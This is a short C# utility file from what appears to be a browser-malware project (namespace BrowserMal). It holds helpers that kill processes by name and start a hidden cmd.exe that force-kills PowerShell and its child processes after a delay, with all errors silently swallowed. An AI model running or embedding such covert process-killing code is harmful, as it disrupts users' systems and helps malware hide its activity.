using System.Diagnostics;

namespace BrowserMal.Util
{
    public class ProcessUtil
    {
        public static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);

            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }
        }

        public static void RunAfterSeconds(string seconds)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                CreateNoWindow = true,
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 3 >NUL && taskkill /F /IM powershell.exe /T"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch { }
        }
    }
}
